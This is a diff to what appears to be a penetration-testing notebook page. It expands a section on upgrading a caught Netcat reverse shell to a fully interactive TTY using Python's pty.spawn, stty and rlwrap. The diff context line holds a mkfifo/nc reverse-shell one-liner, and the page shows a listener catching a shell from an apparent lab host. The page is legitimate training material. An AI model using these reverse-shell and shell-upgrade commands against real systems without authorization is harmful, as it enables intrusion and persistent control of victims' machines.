@@ -58,35 +58,156 @@ mkfifo /tmp/f; nc $IP $PORT < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
 
 ## Stabilization Techniques
 
+A basic Netcat shell does not have all the features available in a regular (e.g. local) shell session. For example, using `Ctrl + C` kills the shell connection instead of killing whatever is running in the shell session. In order to upgrade to a full [TTY](https://unix.stackexchange.com/questions/4126/what-is-the-exact-difference-between-a-terminal-a-shell-a-tty-and-a-con) shell the following techniques can be used.
+
 ### Python
 
-Linux boxes generally have Python installed by default and it can be used to stabilize the shell. For this reason this method will generally work on Linux boxes but most Windows machines do not have python installed and enabled by default.
+Linux boxes generally have Python installed by default and it can be used to stabilize the shell. This method is explained [here](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/#method-1-python-pty-module). Some additional techniques for launching the shell are listed [here](https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/full-ttys).
 
-The shell should be launched with `python -c 'import pty;pty.spawn("/bin/bash")'` as the execution invocation.
+#### Spawn pty Shell
 
-* This command is used to _upgrade_ an existing dumb shell
-* The `pty` module gives capability to initiate a pseudo-terminal that can force  `su` and `ssh`  commands to think they are run in standard terminal
+The method leverages the Python 3 library [pty](https://docs.python.org/3/library/pty.html)  which defines operations for handling the pseudo-terminal concept. Specifically it uses the [`pty.spawn()`](https://docs.python.org/3/library/pty.html#pty.spawn) method to launch a new process and control it via the current terminal session. For the most part this will be used to launch bash as follows:
 
-Once a dumb reverse shell is obtained run it can be upgraded as follows
-
-```bash
-kali@kali:~$ nc -lvnp 5555
-listening on [any] 5555 ...
-connect to [192.168.119.209] from (UNKNOWN) [192.168.209.52] 41726
-
-$ python3 -c 'import pty; pty.spawn("/bin/bash")'    # Run on attacker's machine in "dumb shell"
+```python
+import pty
+pty.spawn('/bin/bash')
 ```
 
-At this point the upgraded shell is suspended with `Ctrl + Z`. The attacker's terminal can then be used to run some stabilizing commands before resuming the shell.
+It can be launched as a one liner from on the victim machine with the following shell command:
 
 ```bash
-kali@kali:~$ export TERM=xterm
-kali@kali:~$ stty raw -echo; fg
+python3 -c "import pty;pty.spawn('/bin/bash')"
 ```
 
-<table><thead><tr><th width="221">Command</th><th>Action</th></tr></thead><tbody><tr><td><code>export TERM=xterm</code></td><td>Sets xterm as the terminal window manager</td></tr><tr><td><code>stty raw -echo</code></td><td>Sets I/O to standard device and turns off attacker's own terminal echo.<br><br>Gives access to tab autocomplete, arrow key usage, and <code>Ctrl + C</code> can be used to kill processes without exiting the shell.</td></tr><tr><td><code>fg</code></td><td>Foregrounds the shell job.</td></tr></tbody></table>
+An example of this is shown below:
 
-This technique is discussed more thoroughly in [this](https://www.infosecademy.com/netcat-reverse-shells/) blog.
+```
+kali@kali$ nc -lvnp 4444
+listening on [any] 4444 ...
+connect to [192.168.45.159] from (UNKNOWN) [192.168.205.63] 46170
+...
+confluence@confluence01:/tmp$ python3 -c 'import pty; pty.spawn("/bin/sh")'
+python3 -c 'import pty; pty.spawn("/bin/bash")'   
+$
+```
+
+Once this is achieved, the shell session is backgrounded with `Ctrl + Z` (inside the caught Netcat session). That will look like this:
+
+```
+...
+confluence@confluence01:/tmp$ python3 -c 'import pty; pty.spawn("/bin/bash")'
+python3 -c 'import pty; pty.spawn("/bin/bash")'   
+$ ^Z
+zsh: suspended  nc -lnvp 4444
+```
+
+#### Current Shell Session Details
+
+From here the specifications of the current shell must be examined. This will be used to set up a fully interactive session. To get this information in the session (with the now backgrounded Netcat session) run:
+
+```
+stty -a
+```
+
+The output from this command will look something like this:
+
+```bash
+kali@kali:~$ stty -a
+speed 38400 baud; rows 54; columns 237; line = 0;
+intr = ^C; quit = ^\; erase = ^?; kill = ^U; eof = ^D; eol = <undef>; eol2 = <undef>; swtch = <undef>; start = ^Q; stop = ^S; susp = ^Z; rprnt = ^R; werase = ^W; lnext = ^V; discard = ^O; min = 1; time = 0;
+-parenb -parodd -cmspar cs8 -hupcl -cstopb cread -clocal -crtscts
+-ignbrk -brkint -ignpar -parmrk -inpck -istrip -inlcr -igncr icrnl ixon -ixoff -iuclc -ixany -imaxbel iutf8
+opost -olcuc -ocrnl onlcr -onocr -onlret -ofill -ofdel nl0 cr0 tab0 bs0 vt0 ff0
+isig icanon iexten echo echoe echok -echonl -noflsh -xcase -tostop -echoprt echoctl echoke -flusho -extproc
+```
+
+The relevant details are the number of rows (`54` in example) and columns (`237` in example). It also important to know the terminal type. This can be viewed in the `$TERM` variable:
+
+```bash
+echo $TERM
+```
+
+The output will look something like:
+
+```bash
+kali@kali:~$ echo $TERM            
+xterm-256color
+```
+
+#### Set Shell Session I/O
+
+At this point the [`stty`](https://man7.org/linux/man-pages/man1/stty.1.html) utility is used to set the IO device as follows (run in the session with the backgrounded Netcat session):
+
+```bash
+stty raw -echo
+```
+
+This sets I/O to standard device and turns off attacker's own terminal echo. The benefits of this are it gives access to tab autocomplete, arrow key usage, and `Ctrl + C` can be used to kill processes without exiting the shell. The Netcat session is then foregrounded with the [`fg`](https://www.geeksforgeeks.org/fg-command-in-linux-with-examples/) command. This can be combined into a single line as shown below:
+
+```bash
+stty raw -echo; fg
+```
+
+#### Optional Reset
+
+Executing this in the reverse shell session can cause the shell to become misaligned so it can be reset with the `reset` command as seen in this screenshot:
+
+<figure><img src="../../../.gitbook/assets/ShellStabilization-NetcatReset.png" alt=""><figcaption><p>Resetting the Netcat shell</p></figcaption></figure>
+
+* Note: sometimes the reset will cause a prompt asking for the terminal type. If this happens, enter the `$TERM` value (found earlier in the example)
+* This step is optional as the terminal will have to be reset again at the end of the setup
+
+#### Setting Shell Session Variables
+
+At this stage the SHELL and TERM session variables must be set, and then `stty` will be used to set the number of rows and columns for the session window. The commands are shown below:
+
+```bash
+export SHELL=/bin/bash
+export TERM=xterm-256color
+stty rows 54 columns 237
+```
+
+* The value for `$SHELL` is the same as used in the `pty.spawn()` call
+* The value for `$TERM` is the same as the attacker's shell found with `echo $TERM` above
+* The `rows` and `columns` values are the same as the attacker's shell session found with `stty -a` above
+
+They can be combined into a one-liner as shown below:
+
+```bash
+export SHELL=/bin/bash; export TERM=xterm-256color; stty rows 54 columns 237
+```
+
+#### Reset Shell
+
+From here the shell must be reset with the `reset` command. This will cause all of the changes made above to take effect.
+
+After the reset the shell appears exactly as if it were running on the local machine:
+
+<figure><img src="../../../.gitbook/assets/ShellStabilization-FullTty.png" alt=""><figcaption><p>Full TTY shell</p></figcaption></figure>
+
+The session even has tab complete, `Ctrl + C` for killing jobs, etc.
+
+#### Simplified
+
+This whole thing can be simplified a bit. The first stage is to get a normal Netcat shell. From there launch the pty session with `pty.spawn()`:
+
+```bash
+python3 -c "import pty;pty.spawn('/bin/bash')"
+```
+
+* `/bin/bash` can be replaced with whatever shells are available on the machine (listed in `/etc/shells`)
+
+At this point the session is backgrounded with `Ctrl + Z`. If needed, the shell specifications (`rows`, `columns`, and `$TERM`) can be researched here. Once those values are known the whole thing can be run as a single one-liner:
+
+{% code overflow="wrap" %}
+```bash
+stty raw -echo; fg; export SHELL=/bin/bash; export TERM=xterm-256color; stty rows 54 columns 237; reset;
+```
+{% endcode %}
+
+* Value for `$SHELL` is the same `pty.spawn()` call argument&#x20;
+* Values for `rows` and `columns` are the same as attacker's shell session (viewed with `stty -a`)&#x20;
+* Value for `$TERM` the same as attacker's shell session (viewed with `echo $TERM`)
 
 ### rlwrap
 
@@ -96,7 +217,7 @@ Program which gives user access to history, tab auto-completion and the arrow ke
 * Some additional manual stabilization must be done in order to use Ctrl+C command in the terminal to stop commands on target without exiting reverse shell
 
 ```bash
-kal@kali:~$ rlwrap nc -lvnp {PORT}
+kal@kali:~$ rlwrap nc -lvnp $PORT
 ```
 
 Invoked by simply placing `rlwarp` command ahead of the standard `nc` listener command for a reverse shell.
